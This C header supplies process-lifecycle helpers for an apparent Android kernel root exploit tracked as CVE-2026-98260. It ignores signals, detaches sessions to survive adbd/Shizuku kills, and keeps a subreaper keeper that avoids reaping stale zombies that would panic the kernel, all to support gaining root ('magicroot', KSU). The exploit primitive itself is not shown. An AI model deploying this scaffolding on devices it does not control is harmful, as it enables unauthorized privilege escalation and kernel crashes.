/*
 * CVE-2026-98260 process lifecycle helpers.
 *
 * A failed plant keeps a zombie whose reaping runs cleanup_timerqueue() on a
 * stale timer node and panics the kernel.  The exploit therefore must never
 * lose its parent while such a zombie exists.  This header provides:
 *
 *   - SIGPIPE/SIGHUP/SIGINT/SIGTERM ignore, so a closed launcher pipe or a
 *     process-group signal cannot kill the holder;
 *   - setsid() for the keeper and the worker, so adbd/Shizuku group kills do
 *     not take them down;
 *   - a keeper parent with PR_SET_CHILD_SUBREAPER, so if the worker dies its
 *     children are reparented to the keeper instead of init;
 *   - a simple file log so a closed stdout pipe does not destroy evidence.
 *
 * The keeper never calls waitpid(-1): reaping an adopted stale-zombie child
 * is exactly the operation that panics.  It only waits for the worker PID,
 * then scans /proc for children before exiting.
 */
#ifndef CVE98260_LIFECYCLE_H
#define CVE98260_LIFECYCLE_H

#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>

static int cve_lifecycle_log_fd = -1;

static void cve_lifecycle_open_log(const char *tag)
{
    char path[160];

    snprintf(path, sizeof(path), "/data/local/tmp/cve98260-%s-%d.log",
             tag ? tag : "run", (int)getpid());
    cve_lifecycle_log_fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0644);
}

static void cve_lifecycle_note(const char *fmt, ...)
{
    va_list ap, ap2;

    va_start(ap, fmt);
    vdprintf(STDERR_FILENO, fmt, ap);
    if (cve_lifecycle_log_fd >= 0) {
        va_copy(ap2, ap);
        vdprintf(cve_lifecycle_log_fd, fmt, ap2);
        va_end(ap2);
    }
    va_end(ap);
}

static void cve_lifecycle_ignore_signals(void)
{
    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
}

static void cve_lifecycle_new_session(const char *name)
{
    if (setsid() < 0)
        (void)setpgid(0, 0);
    if (name)
        prctl(PR_SET_NAME, name, 0, 0, 0);
}

static int cve_lifecycle_has_children(void)
{
    DIR *d;
    struct dirent *de;
    pid_t self = getpid();
    int found = 0;

    /*
     * Android kernels may lack CONFIG_PROC_CHILDREN, so
     * /proc/self/task/<pid>/children does not exist.  Scan /proc for a
     * process whose PPID is the keeper instead.  This must not reap: a
     * waitpid(-1) on an adopted stale-zombie is the panic.
     */
    d = opendir("/proc");
    if (!d) {
        siginfo_t si;
        int r, err;
        memset(&si, 0, sizeof(si));
        errno = 0;
        r = waitid(P_ALL, 0, &si, WEXITED | WNOHANG | WNOWAIT);
        err = errno;
        cve_lifecycle_note("[life] opendir(/proc) failed: %s; waitid=%d "
                           "pid=%d errno=%d\n", strerror(err), r,
                           (int)si.si_pid, err);
        if (r == 0)
            return si.si_pid != 0;
        return err == ECHILD ? 0 : 1;
    }
    while ((de = readdir(d)) != NULL) {
        char path[64], buf[512], comm[64];
        char *lp, *rp, *sp;
        char state = 0;
        int fd, ppid = -1;
        ssize_t n;

        if (de->d_name[0] < '0' || de->d_name[0] > '9')
            continue;
        snprintf(path, sizeof(path), "/proc/%s/stat", de->d_name);
        fd = open(path, O_RDONLY);
        if (fd < 0)
            continue;
        n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n <= 0)
            continue;
        buf[n] = 0;
        rp = strrchr(buf, ')');
        lp = strchr(buf, '(');
        if (!rp || !lp || rp <= lp || rp[1] != ' ')
            continue;
        snprintf(comm, sizeof(comm), "%.*s",
                 (int)(rp - lp - 1), lp + 1);
        sp = rp + 2;
        /* sp: "S 123 ..." */
        if (sscanf(sp, "%c %d", &state, &ppid) != 2 || ppid != self)
            continue;
        /*
         * Only the exploit's exec target is dangerous.  A running or zombie
         * ksud daemon or the exploit's own helper clone must not turn a
         * successful KSU run into PARKED=1, so match the target thread name
         * specifically.  The helper clones exit as "magicroot" and have no
         * stale timer node; reaping them is safe.
         */
        if (strstr(comm, "yexec") || strstr(comm, "yhelp")) {
            found = 1;
            break;
        }
        (void)state;
    }
    closedir(d);
    return found;
}

static void cve_lifecycle_mark_parked(void)
{
    char boot[128];
    const char *path = getenv("CVE_PARKED_FILE");
    ssize_t n;
    int fd, in;

    if (!path || !*path)
        path = "PARKED";
    in = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
    if (in < 0)
        return;
    n = read(in, boot, sizeof(boot) - 1);
    close(in);
    if (n <= 0)
        return;
    boot[n] = 0;
    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0)
        return;
    (void)write(fd, boot, (size_t)n);
    close(fd);
}

static void cve_lifecycle_park(const char *why)
{
    /* The runner may already be gone; leave a same-boot marker at
     * CVE_PARKED_FILE (or cwd/PARKED) so a later run.sh/clean.sh refuses to
     * touch this workspace. */
    cve_lifecycle_mark_parked();
    cve_lifecycle_note("[life] %s; keeper parking without reaping\n",
                       why ? why : "held child");
    /*
     * The runner reads stdout through a pipe.  The worker is already gone;
     * close both ends so a failure path cannot make run.sh wait forever for
     * EOF while the keeper parks.
     */
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    for (;;)
        pause();
}

static int cve_lifecycle_supervise(int (*worker)(int, char **),
                                   int argc, char **argv)
{
    pid_t w;
    int st = 0;

    cve_lifecycle_ignore_signals();
    cve_lifecycle_new_session("mroot-keeper");
    (void)prctl(PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0);

    w = fork();
    if (w < 0) {
        cve_lifecycle_note("[life] keeper fork failed: %s\n", strerror(errno));
        return 1;
    }
    if (w == 0) {
        cve_lifecycle_new_session("magicroot");
        cve_lifecycle_open_log("worker");
        cve_lifecycle_note("[life] worker pid=%d ppid=%d pgrp=%d sid=%d\n",
                           (int)getpid(), (int)getppid(),
                           (int)getpgrp(), (int)getsid(0));
        _exit(worker(argc, argv));
    }

    for (;;) {
        pid_t r = waitpid(w, &st, 0);

        if (r == w)
            break;
        if (r < 0 && errno == EINTR)
            continue;
        cve_lifecycle_note("[life] waitpid(worker) failed: %s\n",
                           strerror(errno));
        cve_lifecycle_park("keeper waitpid failed");
    }

    if (WIFEXITED(st))
        cve_lifecycle_note("[life] worker exited status=%d\n",
                           WEXITSTATUS(st));
    else if (WIFSIGNALED(st))
        cve_lifecycle_note("[life] worker killed by signal %d\n",
                           WTERMSIG(st));
    else
        cve_lifecycle_note("[life] worker wait status=%#x\n", st);

    if (cve_lifecycle_has_children()) {
        cve_lifecycle_park("worker exited with adopted children");
    }

    if (WIFEXITED(st))
        return WEXITSTATUS(st);
    if (WIFSIGNALED(st))
        return 128 + WTERMSIG(st);
    return 1;
}

#endif /* CVE98260_LIFECYCLE_H */
